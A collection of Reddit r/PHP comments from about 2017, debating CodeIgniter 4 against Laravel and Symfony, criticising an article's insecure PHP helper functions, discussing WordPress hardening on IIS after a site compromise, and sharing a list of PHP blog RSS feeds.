PHP, Python, Node (JavaScript) are all good languages to start out with as new developer. Each language have its own characteristics and usefulness, which you will find out when you learn them. When you eventually learn all three of them, you will get an opportunity to compare their individual pros and cons and better understand why programming languages differ and is same-same. They differ, but what can be done in one language can many times be done in another language, just tweak it. Its all about getting to know the language you work with, use it pros, avoid its cons. Its hard to be future prof when you consider a career spanning over 50 years. You will hopefully learn a lot of languages and enjoy them depending on your team/project setup/needs/requirements. The best choice to start with is all about you, your team/project setup/needs/requirements. It depends on what you are going to do.
This post was removed because you have a new account and we get a lot of spam from newly created accounts. If you have any questions or think your post should be reinstated, please send a message to the mods. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/PHP) if you have any questions or concerns.*
100% I used to work in IT and it was hell.. and I realized the reason for this is the end-users/customers are a bunch of tools. 
IUSR is the IIS account in windows, yes. I disabled all IUSR access from the root of that partition. Websites still run but new files shouldn't be allowed to be created. This may get me through. My cousin I haven't seen in 2 years is coming to visit in a couple days so this is really, really bad timing. I changed all the user access for each sites DB access, basically replaced the entire wordpress file structure for every site, reset all the keys. I'm still concerned that there's an exploit. One of my customers has an old form processor that may be compromised but I won't know that until I start moving the sites to the new server. Not sure what I'm going to do with the sites that aren't wordpress yet. :(
The right translation is actually: "Delete your fucking project Fabien. And let your seat to Taylor and its Laravel." (I'm French btw)
You can't properly parse nested structures such as JSON, XML or HTML with a regular expression because they aren't regular languages. You must be super confident about the data you're going to receive, or else you're risking it blowing up eventually.
My client also needs to be able to print their documents to PDF, but their site is on a shared web host, so I can't install wkhtmltopdf. I've had to resort to domPDF, jpeg templates for each page, and hard coding each field with fixed pixel coordinates. Is this horrible design?
wow, so many symfony lovers, so many codeigniter haters..nice
The hypocrisy of this sub is incredible. When someone submits a custom compiler y'all like "this is useless because x". But when someone submits a compiler generator y'all like "wow! what a great idea". Don't get me wrong – I am a huge fan of Antony and Nikita. I love this project. I love most compiler projects. But the cognitive dissonance, here, is real. 
Could you elaborate on how CodeIgniter 4 is different from CodeIgniter 3, as well as its competitors (Symfony, Laravel, Nette, Cake, Yii, etc)?
If you're a developer, you can start by going to this page: https://github.com/bcit-ci/CodeIgniter4/labels/help%20wanted
I'm just gonna say that I read that as 'fapbot' and got me confused for a sec
&gt; Lots of developers start new projects using Codeigniter, and CI3 is way before the latest PHP standards. The faster CI4 gets out, the better will be for the whole PHP Community. I'm sorry to have to say that, but it's too late to be modernizing a project that already has the stigma of being old and irrelevant. People are already migrating from Code Igniter to things like Symfony and Laravel. The ship has sailed. It's true many are still starting project in Code Igniter 3, but it's naive to think those same people would adopt version 4 when it's out, especially if it's not backwards compatible. Witness what happened to Perl 6: it was to be the best ever update to Perl, it took a bit too long to make, and when it got out it was but a blip on the radar of the computer industry. If someone needs a modern language they just move from Perl 5 to something else, like Python, or V8, or Ruby. Most of Perl users are still using 5.x, distros are shipping 5.x, and 6 might as well not exist. 
The password generation is insecure, do not use it. Use random_bytes. 
It is not clear when you should use input_filter Sanitizing should be done by libraries at the point of consumption. Different data formats require different sanitizing. 
Escaping SQL is not necessary. Nowadays everyone uses prepared statements. 
What year is it ?
I see you've not yet contracted any cheap PHP agency.
There is a bug in cut_text where it removes all n's and r's php &gt; echo cut_text('I like functions', 50, '...'); I like fuctios
Filter User Input: what does it filter? It's useless without more details on what type of input it works. Escape for MySQL: have you ever heard of prepared statements? Using real_escape_string is not really safe. Create a random password: 8 characters from the [a-z0-9] subset? Come on, it's 2017 already! Encode email address: this obfuscation method was broken in 2008 (see [this article](http://techblog.tilllate.com/2008/07/20/ten-methods-to-obfuscate-e-mail-addresses-compared/) for example)... Get IP Address: a good reminder that client IP could be in any of these keys, but certainly not "*the best and most accurate way*". Cut some long text: for variable-width fonts, it's better to use text-overflow CSS property. It's 2017 and we have PHP7 now, you should check that.
cut_text does not work on utf-8 php &gt; echo cut_text('子ずぶぼラ込57日るレ関花ぶ仕応オラ', 20, '...'); 子ずぶぼラ込57... 
cut_text does not work on utf-8 echo cut_text('花ぶ仕応オラ面書エヱニカ最認神タレカモ裁探セ今球航えフせイ 利憶クミ問税佐剛嫌摩ドーあ。再キヱアエ', 20, '...'); 花ぶ仕応オラ��...
dude providing such "useful" functions just shows to me that you are totally not up-to-date about php and web development in general. the random password generator function is just wrong on so many levels. I try not to rant about it, but these functions are the reason many people think that the language is not capable for using it in state-of-the-art maintainable and readable software. many information can be found by reading in the php docs
 $text = str_replace(array("r","n",'"'), "", $text); Code is so bad, all you can learn from it is not to write code this bad.
/r/ZendpireDidNothingWrong 
More than a thousand views on an article that suggests using outdated, insecure, legacy and ugly code. The functions are most likely not written by author himself as the coding style and knowledge differs in every function. Dear reader, please do not use any of this.
post updated... it looks something went wrong when sharing from mobile
Just use password_hash
Yea, like is `$this` still the everything god object?
That's not the same thing. You'll still need to generate the input of password_hash().
I clicked around a few files. This doesn't exactly shine well with me: https://github.com/bcit-ci/CodeIgniter4/blob/develop/application/Controllers/Checks.php - global functions - query builders mixed with raw SQL - inconsistent indenting - commented out code - inline HTML Also what is this class https://github.com/bcit-ci/CodeIgniter4/blob/490a31c761844f0ab25bb30e8af8f3907fd2dd57/system/Config/Services.php The do everything class? Its got CLI, Curl, autoloading, caching, exceptions handling, logging, sessions, typography, and more in it. Why no dependancy injection? 
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [bcit-ci/CodeIgniter4/.../**Checks.php** (develop → 967750e)](https://github.com/bcit-ci/CodeIgniter4/blob/967750ee4c3893417a007b27f96a8e572c62ae2c/application/Controllers/Checks.php) ---- ^(Shoot me a PM if you think I'm doing something wrong.)
I agree with you, this class should be changed. Why don't you submit a class change pull request?
That's interesting, have you tried https://github.com/humbug/humbug and if so how does your project compare to it?
On the one hand I agree with you. On the other hand, having only 1,5 popular frameworks (given L is using a lot of S components) kills the competition and leads to the decline in quality. The more good FWs we have, the more competition, the better quality for all.
IIRC it's because $a['b']['c']['d'] = 3; relies on retrieving `$a` not triggering an error and instead returning null, then retrieving `$a['b']` not triggering an error and returning null, and so on. So there's a bit of a hack there to allow this to work.
https://3v4l.org/lUi2Z It could have save me some production debugging time if it triggers a notice when trying to array access FALSE! :-)
Merci
Makes sense in the case of null for the mentioned feature, but not for when $a is boolean or integer, should trigger a warning like for string values.
You can't really properly squat on a domain name anymore. The majority of countries honour registered trademarks, so the domain registrars of that country will just hand it over to the rightful owner. 
Thank you, a very good example.
I'm sorry to say this, but I think every minute spent at CI4 is a waste of time... CI is old and not relevant anymore. It won't be able to compete against Symonfy or Laravel for example. CI's time is long gone!
Sure. Here is a link with detailed comparison https://infection.github.io/guide/compare.html The main points are: 1. Infection uses AST 2. Much more mutators 3. Better DX 4. Actively developed 
Yes. I think that was an oversight where we checked whether `$a`/its sub-arrays were “false” (in the type-juggled sense) rather than checking for NULL.
&gt; wow, so many symfony lovers, so many codeigniter haters..nice Or... it could be that trying to shamelessly plug CodeIgnitor is not germane to this conversation.
There are still other frameworks out there like CakePHP and Yii, both of which are still active and more modern than CI.
I get that you don't agree with the way frameworks approached the issue so far, but it's ridiculous to attempt to solve a problem without first analyizing how others have attempted to do it so far. Would you build a car without ever looking under the hood of an existing one?
That's why I said, &gt;the default
There are other frameworks, you're just dismissing them out of hand.
I have included that somewhere. However without doing it yourself you can't really know half of what a framework is doing. You can also look at any PHP implementation to the same effect. The thing is frameworks don't ain to solve any particular problem. They try to solve every possible conceivable problem which means they tend not to solve many particular problems particularly well. A framework isn't like building a car from scratch. It is like trying to provide you a mister potato head base car that can support any number of wheels, doors, drivers seats, that can be made into a bus, train, tank, etc. A car built like that just isn't going to have a chance in hell against a car built to spec. You can get good car frameworks or build kits but those might be reasonable. As in they might expect four wheels or an engine but not ten wheels or a massive tank engine.
It's also an idea to create different pools for each site with different users. That way one site can't mess up another. As for writes, it's not just about adding new files but also altering existing ones. For WordPress there are some good hardening guides out there. 
Meh, don't really care. I have multiple successful websites, never bought a domain from squatter and never will. Just use your imagination, and it's not a problem.
&gt; The thing is frameworks don't aim to solve any particular problem Indeed. But there are commonalities such as routing, which you should understand before reinventing.
They will probably never connect cause and effect. They'll blame something else when the hoped-for result doesn't materialize. After all, this thing is exactly what they asked for, so how could it be bad?
[removed]
Yeah, I've been studying wordpress hardening on windows servers for 5 years or so on and off. I'm pretty up to par and each IIS site has its own application pool. In this case, I have to assume the only site that wasn't touched (an old site with form processor pro) was the culprit. It's one of the few sites I don't manage on my server. I may have to move them somewhere else or invest the time to fix the issue for them.
it's an interesting dilemma and you may be right that some people will never develop meaningful insight. I believe that a more common reaction is some form of buyer's remorse. They may not ever come around to knowing what they need but most will eventually discover that what they asked for wasn't what they needed, thus the remorse. 
Do you know any new PHP project by a startup/big company in 2017? The kind of projects you can show your boss/clients and say: "Look at these big guys also using PHP" (Reposting it since it was a little late last week and got no replies)
&gt; Witness what happened to Perl 6: it was to be the best ever update to Perl, it took a bit too long to make, and when it got out it was but a blip on the radar of the computer industry. I don't think that's really comparable. Perl 6 is an entirely different language now. It's not just Perl 5 with updates.
I don't think anyone thought `random moron` meant the possibility of a street vendor from Morocco or a marine welder said something moronic. You're interpreting it too literally.
&gt; I don't think that's really comparable. Perl 6 is an entirely different language now. It's not just Perl 5 with updates. CodeIgniter 4 is also not trying to be "CodeIgniter 3 with updates". It's marketing itself as a "modern version of CodeIgniter". Have you seen how archaic the entire CodeIgniter architecture and APIs are? You'd have to turn it inside out to make it "modern".
&gt; Anyone who remembers him from before he rage quit Reddit knows this. FYI: He deleted his original account but made a new one in the past few months. Maybe he's learned something, maybe we're in for a Round 2.
&gt;Most of you are using Symfony/Laravel/Zend/Cake or YII these days. Who is using Symfony? 
You're part of the problem that this topic is about. You're trying to make this framework vs. framework.
&gt; Codes of Conduct DON'T YOU SAY THAT PHRASE HERE! We've already dodged that bullet once! ;)
Just because Laravel uses Symfony Components doesnt make it less of a framework.
It’s funny that you expected end users to understand that constraint system you have there. You may as well ask them to write their own sql queries
I guess every sana developer uses symfony or laravel 
I will have a look since I am a big CI hater..it is promising to have a more modern CI that it would not mislead so much junior devs but I am afraid it will not hapen. But lets be open minded cause anything is better than CI3
sure laravel, but symfony? Besides french people who else is using it for new projects?
So, you want to know of either a startup company, or a big company that uses PHP?
loooooooooool
loooooooooool
AFAICT the CodeIgniter user base (both the previously-existing ones, and the ones I expect Code Igniter targets as its new audience) has largely moved to Laravel.
Yes, just like this: https://facebook.github.io/react-native/showcase.html, but only new projects, without legacy projects like Facebook, MediaWiki, Tube sites.
loooooooooool
True, take a step up out of the actual language and the battles continue.... this language vs that language. I've been lucky enough to work professionally with 6 different languages in my career (and 3/4 others creating hobby level projects) and its the same in every community, this isn't unique to PHP. 
&gt; Even his tweet here it feels both dismissive and like he's trying to one-up Fabien with the fact he got a few "death threats". To balance this up, I often seen Taylor getting abusive comments on here and also tweets directed at him from the Symfony community and no one in the Symfony project even bothered to reply or dismiss the comments made. At the same time should project leaders really be taking time out to defend what random idiots they have no connection to say on the internet? Probably not.
That battle has died out now, that was thought a few years ago
Can anyone TLDR this?
An RFC to fix this has been accepted (https://wiki.php.net/rfc/notice-for-non-valid-array-container), but has not landed yet. (The PR has recently been picked up again, so I expect this for 7.3.)
You don't need routing. PHP comes with that.
Symfony is the only good option for serious projects these days. Laravel is popular, but, that doesn't mean it's good.
Why laravel is not good option for serious projects? What offer that laravel doesn't?
Many frameworks are giant bloats of many people's code making grand assumptions and full of hidden and public but immutable opinion on how to do things because they think you're dumb or don't want to know. That opinion can be sub-optimal in light of the greater public body of design patterns, pragmatic programming ethos, and common sense. Peek into the source code of many popular frameworks and learn why you should start gagging or marveling. Don't just use a framework and especially, don't become religious pedant of your framework of choice or you'll become the equivalent of people who put additives in their gas and think they're master race car mechanics.
Laravel is a step in the right direction, and it's good for beginners. Symfony has better handling of: services, injection, events and listeners, templating, and modeling. Symfony is better tested, and the syntax is more standard. The de-coupling is better in most areas also. Many senior level developers don't take Laravel seriously. 
you can try it with existing projects as well ;)
I get most of my PHP news via email or Twitter, but if you're interested in application security: https://paragonie.com/rss
Thank you for the suggestion. About the email, any newsletter that you recommend?
We're using a CI 2 based CMS for our production app. The whole thing just needs to die. I'm sure it was a useful framework back in the day, but Laravel/Symfony brought so many good practices and sensible components out of the box I can't imagine trying to rewrite a framework to match. CI has even been abandoned by it's original creator Phil Sturgeon. I don't see any use to continue developing it. We're actively moving away from it and for plenty of good reasons.
The latter. It is an object model to make sure the json produced is valid in terms of the spec.
You do realize that I had good intentions when I created this discussion thread? :)
you forgot the /s
Is that because the actually looked at it, or just following the opinions of other devs saying that it’s bad? There are many seniors out there that hide their own insecurities behind the opinions of others. 
By looking through your reddit activity I can say that you work there (or you own it), please add a disclaimer when mentioning your own blogs/websites.. 
&gt; Many senior level developers don't take Laravel seriously. WOW. Saying this makes me wonder if you are a serious developer or you only believe what others say..
Slack
Sorry, I've gotten comfortable and sort of took it for granted that most people knew that already. I'll be more meticulous going forward.
I have no complaints about http://www.securingphp.com
There are three major problems with Laravel: 1. Stick everything in the /app directory. Laravel is a web-framework that is trying to be an application-framework. This means that Lavavel devs will all end up building their applications INSIDE Laravel. 2. Eloquent. ActiveRecord is probably the most terrible way you can do persistence. Persistence should be an aspect of your business logic. ActiveRecord is basically decorating persistence with business logic. 3. Facades. These things just creep into everything. Models reaching into config etc. It seems that Laravel is doing dependency injection without practising inversion of control, so it makes DI pointless. 
I actually created a class to do that: https://github.com/runninguru/notify Basically, your form dictates which php script sends the email, and using my class, you would just type $note = new Notification(); $note-&gt;addNote('success', 'The email was sent'); require $_SERVER['DOCUMENT_ROOT'] . 'email-form.html'; exit; in that same PHP script.
Popup? Like an alert? You need JS for that. Although you can use php and echo a string. It'd be in something like if(isset $_POST [`field']]{ echo("Success")}
PHP can not make popups, JS can. But please, do not use popups. Echo a string with PHP instead - everyone hates popups and those who dont just dont know it yet.
So far it is the preferred framework for seniors..Laravel is used more by less experienced devs..It is the most downloaded PHP framework and drives the entire PHP community. They invented composer and almost all other frameworks use its parts. In europe it is the number 1 pick and has a by far the best job offers. Specially in Germany and nordics it is really popular but also Spain. And Zend and Symfony are the only enterprise options on market...it is the first choice of every really big project
Any tips on what I should learn next? I'm working towards becoming a web developer, and have learned some PHP. I have gone through all these tutorials: https://www.youtube.com/watch?v=qVU3V0A05k8&amp;list=PL0eyrZgxdwhwBToawjm9faF1ixePexft- And some more, and understand the fundamentals of PHP. If I see a piece of PHP code I recognize many of the syntaxes and such, but I'm unsure where to start off to create my own website from scratch with all the most common webpage functions (for instance a profile page, integrated google maps, real time chat system/comment section etc). Anyone got any tips for me? :D
LaraJobs.com?
You know nothing Jon Snow!
mind explaining more or give some example ? Thanks in advance.
can you please echo my code so i can see example i would realy appreciate it.
If you want to turn code igniter into something decent you need to break away from a hell of a lot of bad habits. You still have it doing way to much, in a way that isn't particularly reusable, extensible or well programmed and you still have all this fake security stuff. I haven't found [this](https://github.com/andreybolonin/codeigniter2/blob/be3e5701dd3021459966fd2b88047052a7fe2184/src/system/core/Security.php) ultimate horror in there but it looks like you're already starting with that, take filenameBadChars for example.
Got a Github account? 
Goto is faster than calling functions. It'll also use less memory. For tight and performance sensitive data handling it's well worth it.
but are you using it? 
If a company hires remote, then what distinguishes a US hire from someone in Romania, Vietnam, Malaysia, or anyone else in the world who is probably cheaper? "Skills" sure, but how does a company determine this unless you already have an in-person relationship with said company? 
I've used CI4 for two projects already. It's as easy to learn as CI3, just have to know namespaces. Much easier than Symfony or Laravel. Requires PHP 7. 
The real question is what is a goto? if x and if else if !x goto 1 y 1: if x goto 1 y() // else goto 2 1: z // if 2: dowhile... 1: y() if x goto 1 while 1: if !x goto 2: y() 2: switch, case a:case b:x();break;case c:y();case d:z();break;default: error if(a) goto 1 if(b) goto 1 if(c) goto 2 if(d) goto 3 goto 4 1: x() goto 5; 2: y() 3: z() goto 5; 4: error() 5: You should be able to figure out what breaks and continues in loops do from that and nests ifs or if else chains. If you can make any permutation of gotos other than those ones then yes there's a use case. Good luck.
https://blog.jetbrains.com/phpstorm/tag/annotated-monthly/
Github account or resume link? 
I'm a fan of RSS. Here's content of OPML you can import. Its all feeds I subscribe to &lt;?xml version="1.0" encoding="UTF-8"?&gt; &lt;opml version="2.0"&gt; &lt;head&gt; &lt;title&gt;Subscriptions&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;outline title="PHP" text="PHP"&gt; &lt;outline title="https://asked.io" text="https://asked.io" type="rss" xmlUrl="https://asked.io/rss" htmlUrl="https://asked.io"/&gt; &lt;outline title="Blackfire.io Le Blog" text="Blackfire.io Le Blog" type="rss" xmlUrl="http://blog.blackfire.io/feed/atom.xml" htmlUrl="https://blog.blackfire.io/"/&gt; &lt;outline title="Blog - Sandi Metz" text="Blog - Sandi Metz" type="rss" xmlUrl="http://www.sandimetz.com/blog?format=RSS" htmlUrl="https://www.sandimetz.com/blog/"/&gt; &lt;outline title="Bram.us" text="Bram.us" type="rss" xmlUrl="http://www.bram.us/feed/" htmlUrl="https://www.bram.us/"/&gt; &lt;outline title="CatsWhoCode" text="CatsWhoCode" type="rss" xmlUrl="http://feeds2.feedburner.com/Catswhocode" htmlUrl="http://www.catswhocode.com/blog"/&gt; &lt;outline title="Facebook Code" text="Facebook Code" type="rss" xmlUrl="https://code.facebook.com/posts/rss" htmlUrl="https://code.facebook.com/"/&gt; &lt;outline title="Fideloper" text="Fideloper" type="rss" xmlUrl="http://fideloper.com/feed" htmlUrl="http://fideloper.com/"/&gt; &lt;outline title="Gary Hockin @GeeH" text="Gary Hockin @GeeH" type="rss" xmlUrl="http://blog.hock.in/feed/" htmlUrl="https://blog.hock.in/"/&gt; &lt;outline title="GitHub" text="GitHub" type="rss" xmlUrl="http://githubengineering.com/atom.xml" htmlUrl="https://githubengineering.com/"/&gt; &lt;outline title="Google Online Security Blog" text="Google Online Security Blog" type="rss" xmlUrl="http://googleonlinesecurity.blogspot.com/feeds/posts/default" htmlUrl="http://security.googleblog.com/"/&gt; &lt;outline title="Harrie Verveer" text="Harrie Verveer" type="rss" xmlUrl="http://harrieverveer.nl/rss/feed.xml" htmlUrl="http://harrieverveer.nl/"/&gt; &lt;outline title="ignorethecode.net" text="ignorethecode.net" type="rss" xmlUrl="http://feeds.feedburner.com/IgnoreTheCode" htmlUrl="http://ignorethecode.net/"/&gt; &lt;outline title="Jason McCreary" text="Jason McCreary" type="rss" xmlUrl="http://jason.pureconcepts.net/feed.xml" htmlUrl="http://jason.pureconcepts.net/"/&gt; &lt;outline title="jenssegers.com" text="jenssegers.com" type="rss" xmlUrl="http://jenssegers.be/rss" htmlUrl="http://jenssegers.com/"/&gt; &lt;outline title="Jef Claes on software and life" text="Jef Claes on software and life" type="rss" xmlUrl="http://feed.jefclaes.be/jefclaes" htmlUrl="http://www.jefclaes.be/"/&gt; &lt;outline title="Joe Ferguson" text="Joe Ferguson" type="rss" xmlUrl="http://www.joeferguson.me/feed/" htmlUrl="https://www.joeferguson.me/"/&gt; &lt;outline title="Laravel News" text="Laravel News" type="rss" xmlUrl="https://feed.laravel-news.com/" htmlUrl="https://laravel-news.com/"/&gt; &lt;outline title="Mathias Verraes" text="Mathias Verraes" type="rss" xmlUrl="http://verraes.net/feed.atom" htmlUrl="http://verraes.net/"/&gt; &lt;outline title="Michael Dyrynda | Laravel, PHP, DevOps" text="Michael Dyrynda | Laravel, PHP, DevOps" type="rss" xmlUrl="https://dyrynda.com.au/blog/feed" htmlUrl="https://dyrynda.com.au/blog/feed"/&gt; &lt;outline title="Michael Brooks - RSS Feed" text="Michael Brooks - RSS Feed" type="rss" xmlUrl="https://michaelbrooks.co.uk/rss.xml" htmlUrl="http://michaelbrooks.co.uk/"/&gt; &lt;outline title="murze.be" text="murze.be" type="rss" xmlUrl="https://murze.be/feed/" htmlUrl="https://murze.be/"/&gt; &lt;outline title="nikic's blog" text="nikic's blog" type="rss" xmlUrl="http://nikic.github.io/rss.xml" htmlUrl="http://nikic.github.com/"/&gt; &lt;outline title="Pascal Baljet Media - Blog" text="Pascal Baljet Media - Blog" type="rss" xmlUrl="https://pascalbaljetmedia.com/rss" htmlUrl="https://pascalbaljetmedia.com/rss"/&gt; &lt;outline title="Matt Stauffer on Laravel, PHP, Frontend development" text="Matt Stauffer on Laravel, PHP, Frontend development" type="rss" xmlUrl="http://mattstauffer.co/blog/feed.atom" htmlUrl="https://mattstauffer.co/"/&gt; &lt;outline title="PHP – SitePoint" text="PHP – SitePoint" type="rss" xmlUrl="http://phpmaster.com/feed/" htmlUrl="https://www.sitepoint.com/"/&gt; &lt;outline title="Sarah Mei" text="Sarah Mei" type="rss" xmlUrl="http://www.sarahmei.com/blog/feed/" htmlUrl="http://www.sarahmei.com/blog"/&gt; &lt;outline title="PHPDeveloper.org" text="PHPDeveloper.org" type="rss" xmlUrl="http://www.phpdeveloper.org/feed" htmlUrl="http://www.phpdeveloper.org/"/&gt; &lt;outline title="PhpStorm Blog" text="PhpStorm Blog" type="rss" xmlUrl="https://blog.jetbrains.com/phpstorm/feed/" htmlUrl="https://blog.jetbrains.com/phpstorm"/&gt; &lt;outline title="Purple Booth" text="Purple Booth" type="rss" xmlUrl="https://purplebooth.co.uk/index.xml" htmlUrl="https://purplebooth.co.uk/"/&gt; &lt;outline title="radek.io - Articles" text="radek.io - Articles" type="rss" xmlUrl="http://radek.io/rss.xml" htmlUrl="http://radek.io/"/&gt; &lt;outline title="Ross Tuck" text="Ross Tuck" type="rss" xmlUrl="http://rosstuck.com/feed.xml" htmlUrl="http://rosstuck.com/"/&gt; &lt;outline title="Sebastian De Deyne" text="Sebastian De Deyne" type="rss" xmlUrl="https://sebastiandedeyne.com/feed" htmlUrl="https://sebastiandedeyne.com/feed"/&gt; &lt;outline title="Simone Carletti" text="Simone Carletti" type="rss" xmlUrl="https://simonecarletti.com/blog/feed.xml" htmlUrl="https://simonecarletti.com/"/&gt; &lt;outline title="SOFTonSOFA" text="SOFTonSOFA" type="rss" xmlUrl="https://softonsofa.com/feed/" htmlUrl="https://softonsofa.com/"/&gt; &lt;outline title="Stories by Eric L. Barnes on Medium" text="Stories by Eric L. Barnes on Medium" type="rss" xmlUrl="https://medium.com/feed/@ericlbarnes" htmlUrl="https://medium.com/@ericlbarnes?source=rss-ddd08a1413ea------2"/&gt; &lt;outline title="Stories by Ondřej Mirtes on Medium" text="Stories by Ondřej Mirtes on Medium" type="rss" xmlUrl="https://medium.com/feed/@ondrejmirtes" htmlUrl="https://medium.com/@ondrejmirtes?source=rss-1ce5e2eaba6e------2"/&gt; &lt;outline title="Stories by Colin DeCarlo on Medium" text="Stories by Colin DeCarlo on Medium" type="rss" xmlUrl="https://medium.com/feed/@colindecarlo" htmlUrl="https://medium.com/@colindecarlo?source=rss-88c2ac049edd------2"/&gt; &lt;outline title="Stuart Herbert - Blog" text="Stuart Herbert - Blog" type="rss" xmlUrl="http://blog.stuartherbert.com/rss2.xml" htmlUrl="http://blog.stuartherbert.com/multifeed"/&gt; &lt;outline title="Symfony Blog" text="Symfony Blog" type="rss" xmlUrl="http://feeds.feedburner.com/symfony/blog" htmlUrl="http://symfony.com/blog/"/&gt; &lt;outline title="Symfony Finland" text="Symfony Finland" type="rss" xmlUrl="https://www.symfony.fi/rss/feed.rss" htmlUrl="http://www.symfony.fi/"/&gt; &lt;outline title="Vincent Klaiber" text="Vincent Klaiber" type="rss" xmlUrl="https://vinkla.com/feed.xml" htmlUrl="http://vinkla.com/"/&gt; &lt;outline title="Tutorialzine" text="Tutorialzine" type="rss" xmlUrl="http://feeds.feedburner.com/Tutorialzine" htmlUrl="http://tutorialzine.com/"/&gt; &lt;outline title="Yegor Bugayenko" text="Yegor Bugayenko" type="rss" xmlUrl="http://www.yegor256.com/rss.xml" htmlUrl="http://www.yegor256.com/"/&gt; &lt;outline title="Yappa tech blog" text="Yappa tech blog" type="rss" xmlUrl="http://tech.yappa.be/feed.atom" htmlUrl="http://tech.yappa.be"/&gt; &lt;outline title="Wes Bos" text="Wes Bos" type="rss" xmlUrl="http://feeds.feedburner.com/wesbos/ZXAx" htmlUrl="http://wesbos.com/"/&gt; &lt;outline title="Péhápkaři Blog" text="Péhápkaři Blog" type="rss" xmlUrl="https://pehapkari.cz/blog/" htmlUrl="https://pehapkari.cz/blog/"/&gt; &lt;outline title="Zfort Group Blog" text="Zfort Group Blog" type="rss" xmlUrl="https://www.zfort.com/blog/php-digest-2-news-tools-july-16-july-30-2017-2/" htmlUrl="https://www.zfort.com/blog"/&gt; &lt;outline title="Fabien Potencier" text="Fabien Potencier" type="rss" xmlUrl="http://fabien.potencier.org/" htmlUrl="http://fabien.potencier.org/"/&gt; &lt;outline title="Digital Inspiration Technology Blog" text="Digital Inspiration Technology Blog" type="rss" xmlUrl="https://www.labnol.org/" htmlUrl="https://www.labnol.org/"/&gt; &lt;outline title="Frank de Jonge's Blog" text="Frank de Jonge's Blog" type="rss" xmlUrl="https://blog.frankdejonge.nl/" htmlUrl="https://blog.frankdejonge.nl/"/&gt; &lt;outline title="https://ocramius.github.io/" text="https://ocramius.github.io/" type="rss" xmlUrl="https://ocramius.github.io/" htmlUrl="https://ocramius.github.io/"/&gt; &lt;outline title="LornaJane" text="LornaJane" type="rss" xmlUrl="https://lornajane.net/" htmlUrl="https://lornajane.net/"/&gt; &lt;outline title="Adam Wathan's Blog" text="Adam Wathan's Blog" type="rss" xmlUrl="https://adamwathan.me/" htmlUrl="https://adamwathan.me/"/&gt; &lt;/outline&gt; &lt;/body&gt; &lt;/opml&gt; 
It doesn't do way too much. It's very simple.
CI4 is pre alpha. Checks.php won't be there in the end. It's a quick and dirty set of tests. Services are explained here: https://bcit-ci.github.io/CodeIgniter4/concepts/services.html?highlight=services
Thank you! Gonna check then out :)
A friend sent me this today: https://app.crossover.com/x/redirect/job/2275
What about a CMS specifically for bespoke app development?
the ones that don't want to hire a local developer due the salary?
Since they're all using PHP there's really only one framework. Get your facts straight.
There’s tax issues for the business. There’s a common concept in ethnocentric views for business stakeholders. Some businesses want to stay within local business hours. Maybe with a margin of one to two hours either way.
Dealerinspire.com
I have used CI starting in 2011, then again for a startup in 2013-14. Now reading a lot of these replies make me think "awww man, I bet on the wrong horse!" and now I felt like I have a lot of non-transferable skills to new jobs (probably why it's been getting more difficult for me to find new webdev work). It's also funny because Symfony and CakePHP came out around the same time as CI, and they're still more alive and kicking! I wonder what things are in their framework that helped them pull through.
Github: https://github.com/ccajas Heads up, there's not a lot of PHP work in there, but I have repos covering different things.
Github: https://github.com/ccajas Heads up, there's not a lot of PHP work in there.
Symfony 1 was a pre-5.3 framework and Symfony 2 was a completely rewrite for the post 5.3 world. It has kept up-to-date with modern practices like Composer integration (in fact, Composer started as a Symfony component in the conceptual phase, before the authors decided it's best to keep it more universal). CakePHP has been a framework that has made a steady stream of gradual updates, which has allowed them to stay relevant. They haven't done a full rewrite AFAIK, but they've been relentlessly updating and innovating to keep themselves fresh. And Codeigniter... well it's like programming in PHP4.
Sounds like CodeIgniter just lingered in the early part of the decade since the original creator dropped the ball on it and moved on to something else. Well, I have had the bad luck in picking the losers, so if I move on with Symfony or CakePHP I am almost worried that they'll drop off the face of the earth once I start getting into it too XD
You don't need to feel that bad, because: - CodeIgniter is obsolete, and may get entirely abandoned, but your existing projects won't stop working. It's just sites, man 😃. CodeIgniter 3.0.4 actually runs on PHP 7+ fine. - There's a low risk of Symfony disappearing, because its components are in a ton of projects, including big ones, like Drupal and Laravel. So the community has a lot of vested interest in keeping those working and up-to-date. - There's way to never pick a loser framework, by... not picking a framework. The third option may sound like I'm recommending reinventing the wheel, but I'm merely suggesting that you can rely more on individual components, integrated through facades and adapters, and keep the framework to the absolute minimum, say just thin controllers and templates. No business logic, no DB stuff, no models, no APIs, just HTTP/HTML-specific code. This is the true way forward. Frameworks will always be subject to hypes and fads. They'll always get obsolete and replaced. So the way to win, is to be resistant to this cycle and keep most of your app framework independent.
my .02 as someone who is working on a business grid and only been programming a short while. 1. If the users are asking for excel functionality I am willing to bet your grid is lacking some basic features. 2. Your autofiltering UI is awesome but you probably took it one step too far and should have just hard coded viewmodels. The good news is you can just make the filters for them, it doesn't look like that big of a deal unless I am missing something. 
The repository states This is pre-release code and should not be used in production sites. Why would you use it in a project?
[removed]
I’d humbly suggest not lumping Drupal together with WordPress, Joomla, or similar. If you’re familiar with modern OOP PHP development then I think you’d appreciate Drupal 8.
If you haven't already, I fully recommend posting your resume all over job aggregates (Indeed, etc.) I found my current job that way. I regularly get remote offers on LinkedIn and Indeed.
You have to implement security within your socket protocol, or you can rely upon lower layer level security (like on the TCP level, using IP-whitelisting, or the like). This is a really popular topic at places like Stack Overflow, and a lot of people of given opinions. I would start here: https://security.stackexchange.com/questions/48378/anti-dos-websockets-best-practices And read all of the links. The sort of TLDR is that yes, it's a vector for DDOS attacks. Smart application design can mitigate it, and aggressive and smart firewalling can make it mostly harmless. Security wise, it's a vector that's similar in scope to any interactive web application. If you permit the websocket server-code to do stupid stuff, someone will exploit it.
I am using a lot of stuff but yes a used it on a few enterprisesh projects, it is my first choice for small static sites since you can generate them and since ApiPlatform came out it is the best option for REST apis ..ApiPlatform is just amazing and the since frontend is today all about react, this is a real good combination. But I also use phalcon, lumen and zend and its microframewirk zend expresive. With Symfony 4 and Flex ut is though the best choice nowadays. Brw if you check all the framework trebds you can clearly see that the main players are symfony and laravel
/r/phphelp
